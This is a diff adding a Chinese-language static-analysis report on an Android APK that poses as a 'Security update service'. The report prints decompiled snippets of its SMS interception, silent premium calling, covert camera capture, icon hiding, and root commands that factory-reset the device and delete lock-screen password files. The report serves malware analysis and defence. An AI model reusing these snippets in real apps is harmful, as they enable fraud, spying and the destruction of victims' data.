@@ -1,0 +1,248 @@
+{
+  "APK信息": {
+    "文件名": "5381eb11661d8a52aec6db25f5e6214bbde157b2382ef8d3af9287b95b3a5121.apk",
+    "sha256": "5381eb11661d8a52aec6db25f5e6214bbde157b2382ef8d3af9287b95b3a5121",
+    "包名": "com.system.security_update",
+    "应用名": "Security update service",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 650.7
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\managers\\MyTelephonyManager;",
+          "method_signature": "if(!getAbortBroadcast()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (isChecked) {\n    if (!getAbortBroadcast()) {\n        abortBroadcast();\n    }\n    processPossibleControlMessage(smsMessage);\n}",
+          "malicious_code_snippet_context": "                              PhoneNumberUtil.MatchType matchType = phoneNumberUtil.isNumberMatch(controlNumber, smsMessage.Address);\n                              isChecked = matchType == PhoneNumberUtil.MatchType.EXACT_MATCH || matchType == PhoneNumberUtil.MatchType.NSN_MATCH;\n                          }\n>>>                         if (isChecked) {\n>>>                             if (!getAbortBroadcast()) {\n>>>                                 abortBroadcast();\n>>>                             }\n>>>                             processPossibleControlMessage(smsMessage);\n>>>                         }\n                      }\n                  }\n              }",
+          "behavior_description": "代码在收到短信广播时，将短信发送方地址与预设的控制号码列表进行匹配（先endsWith后缀匹配，再用PhoneNumberUtil.isNumberMatch做精确匹配）。一旦匹配成功，调用abortBroadcast()中止短信广播，使该短信不会传递给系统短信应用，用户无法看到此短信。随后调用processPossibleControlMessage处理该控制指令。这是典型的短信拦截行为，用于隐藏C2控制指令短信，使受害者在无感知情况下被远程控制。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "resetPassword"
+            ]
+          }
+        },
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\SessionManager;",
+          "method_signature": "Command()",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "RootHelper.getInstance().executeRootCommand(\"am broadcast -a android.intent.action.MASTER_CLEAR\");\nScreenPassword.resetPassword();",
+          "malicious_code_snippet_context": "                      m_deferredCommands.add(new DeferredCommand() { // from class: com.system.security_update.SessionManager.7\n                          @Override // com.system.security_update.common.DeferredCommand\n                          public void Command() {\n>>>                             RootHelper.getInstance().executeRootCommand(\"am broadcast -a android.intent.action.MASTER_CLEAR\");\n>>>                         }\n                      });\n                      return 0;\n                  case ScreenPassword:",
+          "behavior_description": "该代码在Command()方法中根据不同的命令类型执行恶意操作：1) 通过RootHelper以root权限发送MASTER_CLEAR广播，触发设备恢复出厂设置，直接清除用户所有数据；2) 调用ScreenPassword.resetPassword()重置设备屏幕锁密码，实现勒索软件的设备锁定功能。数据流向为：远程命令指令(source)→重置屏幕密码/恢复出厂设置(sink)，属于典型的勒索软件设备锁定与数据破坏行为。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lcom\\system\\security_update\\data\\ScreenPassword;",
+          "method_signature": "resetPassword()",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static int resetPassword() {\n    String dbFile = new File(Environment.getDataDirectory(), \"/system/locksettings.db\").getAbsolutePath();\n    String file1 = new File(Environment.getDataDirectory(), \"/system/gatekeeper.password.key\").getAbsolutePath();\n    RootHelper.getInstance().executeRootCommand(\"rm -r \" + dbFile + Marker.ANY_MARKER);\n    RootHelper.getInstance().executeRootCommand(\"rm -r \" + file1);\n    return 0;\n}",
+          "malicious_code_snippet_context": "  \n  /* loaded from: classes.dex */\n  public class ScreenPassword {\n>>>     public static int resetPassword() {\n>>>         String dbFile = new File(Environment.getDataDirectory(), \"/system/locksettings.db\").getAbsolutePath();\n>>>         String file1 = new File(Environment.getDataDirectory(), \"/system/gatekeeper.password.key\").getAbsolutePath();\n>>>         RootHelper.getInstance().executeRootCommand(\"rm -r \" + dbFile + Marker.ANY_MARKER);\n>>>         RootHelper.getInstance().executeRootCommand(\"rm -r \" + file1);\n>>>         return 0;\n>>>     }\n  \n      public static int get(List<UserScreenPassword> list) {\n          return 0;",
+          "behavior_description": "通过 RootHelper 以 root 权限执行 rm -r 命令，删除系统锁屏密码数据库 locksettings.db 和密码密钥文件 gatekeeper.password.key，破坏设备锁屏机制，属于勒索软件破坏系统安全防护的行为。数据流向：Environment.getDataDirectory() 获取系统数据目录路径作为 source → RootHelper.executeRootCommand() 执行 root 删除命令作为 sink。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\control\\PhotoCameraHub;",
+          "method_signature": "if(!this.mPreviewIsRunning && this.camera != null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (!this.mPreviewIsRunning && this.camera != null) {\n    this.camera.startPreview();\n    try {\n        this.camera.autoFocus(this);\n    } catch (Exception e) {\n        this.camera.takePicture(null, null, null, this);\n    }\n    this.mPreviewIsRunning = true;\n}",
+          "malicious_code_snippet_context": "  \n      @Override // android.view.SurfaceHolder.Callback\n      public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) {\n>>>         if (!this.mPreviewIsRunning && this.camera != null) {\n>>>             this.camera.startPreview();\n>>>             try {\n>>>                 this.camera.autoFocus(this);\n>>>             } catch (Exception e) {\n>>>                 Logger.logException(e.getMessage());\n>>>                 try {\n>>>                     this.camera.takePicture(null, null, null, this);\n>>>                 } catch (Exception e2) {\n                      Logger.logException(e.getMessage());\n                  }\n              }",
+          "behavior_description": "代码在SurfaceHolder.Callback的surfaceChanged回调中秘密启动摄像头预览并自动对焦，当自动对焦抛出异常时直接调用takePicture进行拍照。整个过程无需用户交互或知情，属于隐蔽拍照行为。类路径伪装为com.system.security_update，具有明显的恶意伪装特征。拍照后的图像数据通过this回调（onPictureTaken）处理，可被进一步窃取或上传。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\managers\\MyTelephonyManager;",
+          "method_signature": "if(phoneNumber == null || phoneNumber.length()",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent callIntent = new Intent(\"android.intent.action.CALL\");\ncallIntent.setData(Uri.parse(\"tel:\" + phoneNumber));\ncallIntent.addFlags(268435456);\nApp.getContext().startActivity(callIntent);\nPhoneCallsToDelete.add(phoneNumber);",
+          "malicious_code_snippet_context": "          }\n          try {\n              Logger.log(\"Call: \" + phoneNumber);\n>>>             Intent callIntent = new Intent(\"android.intent.action.CALL\");\n>>>             callIntent.setData(Uri.parse(\"tel:\" + phoneNumber));\n>>>             callIntent.addFlags(268435456);\n>>>             App.getContext().startActivity(callIntent);\n>>>             PhoneCallsToDelete.add(phoneNumber);\n              return 0;\n          } catch (Exception e) {\n              return 100;",
+          "behavior_description": "使用 ACTION_CALL Intent 直接静默拨打电话（非 ACTION_DIAL 调起系统UI），无需用户确认即可发起通话。拨打后将号码加入 PhoneCallsToDelete 列表，暗示后续会删除通话记录以隐藏痕迹，这是高级费率电话欺诈或隐蔽通信的典型手法。数据流向：phoneNumber(外部传入/C2控制)→startActivity(ACTION_CALL)静默拨号。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\MainActivity;",
+          "method_signature": "onClick(View v)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "PackageManager packageManager = MainActivity.this.getPackageManager();\nComponentName componentName = new ComponentName(MainActivity.this.getApplicationContext(), MainActivity.class);\npackageManager.setComponentEnabledSetting(componentName, 2, 1);",
+          "malicious_code_snippet_context": "          butt2.setOnClickListener(new View.OnClickListener() { // from class: com.system.security_update.MainActivity.2\n              @Override // android.view.View.OnClickListener\n              public void onClick(View v) {\n>>>                 PackageManager packageManager = MainActivity.this.getPackageManager();\n>>>                 ComponentName componentName = new ComponentName(MainActivity.this.getApplicationContext(), (Class<?>) MainActivity.class);\n>>>                 packageManager.setComponentEnabledSetting(componentName, 2, 1);\n              }\n          });\n          Button butt3 = (Button) findViewById(R.id.button3);",
+          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将 MainActivity 组件设置为禁用状态（参数2=COMPONENT_ENABLED_STATE_DISABLED），使应用图标从启动器中隐藏，用户无法在桌面看到或点击该应用图标。这是恶意软件常用的图标隐藏技术，用于在用户不知情的情况下在后台持续运行恶意行为。数据流向：getPackageManager()/getApplicationContext() → setComponentEnabledSetting(componentName, 2, 1) 禁用主Activity组件",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_reboot",
+      "中文名": "设备重启",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "reboot"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\system\\security_update\\SessionManager;",
+          "method_signature": "Command()",
+          "malicious_behavior": "device_reboot",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String[] cmds = {\"mount -o remount,rw /system\", sb.toString()};\nRootHelper.getInstance().executeRootCommand(cmds);\nm_deferredCommands.add(new DeferredCommand() {\n    public void Command() {\n        RootHelper.getInstance().executeRootCommand(\"reboot\");\n    }\n});",
+          "malicious_code_snippet_context": "                  StringBuilder sb = new StringBuilder();\n                  sb.append(\"rm -r \");\n                  sb.append(apkPath);\n>>>                 String[] cmds = {\"mount -o remount,rw /system\", sb.toString()};\n>>>                 RootHelper.getInstance().executeRootCommand(cmds);\n>>>                 m_deferredCommands.add(new DeferredCommand() { // from class: com.system.security_update.SessionManager.1\n>>>                     @Override // com.system.security_update.common.DeferredCommand\n>>>                     public void Command() {\n>>>                         RootHelper.getInstance().executeRootCommand(\"reboot\");\n>>>                     }\n                  });\n              }\n          }",
+          "behavior_description": "代码通过RootHelper以root权限执行系统级操作：首先重新挂载/system分区为可读写，然后删除指定系统APK文件，最后添加延迟命令执行reboot重启设备。整个流程为：从matcher匹配结果获取apk路径(source)→通过executeRootCommand执行reboot命令(sink)。删除系统APK后重启设备会导致系统组件永久丢失，属于破坏性恶意行为，且类名伪装为系统安全更新以隐蔽意图。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
